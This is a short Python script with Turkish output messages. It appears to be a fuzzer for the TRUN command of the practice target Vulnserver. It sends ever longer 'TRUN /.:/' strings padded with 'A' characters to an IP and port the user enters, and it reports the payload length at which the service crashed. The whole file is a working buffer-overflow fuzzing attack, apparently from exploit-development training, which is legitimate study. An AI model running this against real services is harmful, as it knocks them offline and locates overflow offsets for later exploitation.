import socket
from time import sleep
import sys

numberOfCharacters = 100
stringToSend = "TRUN/.:/" + "A" * numberOfCharacters

while True:
    try:
        ip = input("IP:")
        port = input("Port:")
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect((ip, int(port)))
        bytes = stringToSend.encode(encoding="latin1")
        mySocket.send(bytes)
        mySocket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters
        sleep(1)

    except KeyboardInterrupt:
        print("Sistem," + str(len(stringToSend)), ". Pakette çökmüştür.")
        sys.exit()
    except Exception as e:
        print("Sistem," + str(len(stringToSend)), ". Pakette çökmüştür.")
        print(e)
        sys.exit()